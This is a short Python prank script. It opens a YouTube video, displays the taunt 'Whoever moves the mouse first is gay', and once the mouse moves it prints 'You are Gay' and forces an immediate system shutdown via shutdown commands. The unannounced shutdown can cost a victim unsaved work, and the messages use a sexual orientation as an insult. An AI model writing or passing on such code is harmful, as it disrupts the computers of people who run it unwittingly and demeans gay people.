import webbrowser
import subprocess
import time
import pyautogui
import os

YOUTUBE_LINK = "https://www.youtube.com/watch?v=hNCZh6Sh4jI"

def open_cmd_with_message(message):
    if os.name == 'nt':
        subprocess.Popen(['cmd', '/c', f'echo {message} && pause'])
    else:
        subprocess.Popen(['xterm', '-e', f'echo {message} && read -p "Press Enter to exit..."'])

webbrowser.open(YOUTUBE_LINK)

time.sleep(5)

message = "Whoever moves the mouse first is gay"

open_cmd_with_message(message)

initial_position = pyautogui.position()

print("Whoever moves the mouse first is gay")

while True:
    time.sleep(1)
    current_position = pyautogui.position()
    
    if current_position != initial_position:
        print("You are Gay")
        break

if os.name == 'nt':
    os.system('shutdown /s /t 1')
else:
    os.system('sudo shutdown now')
    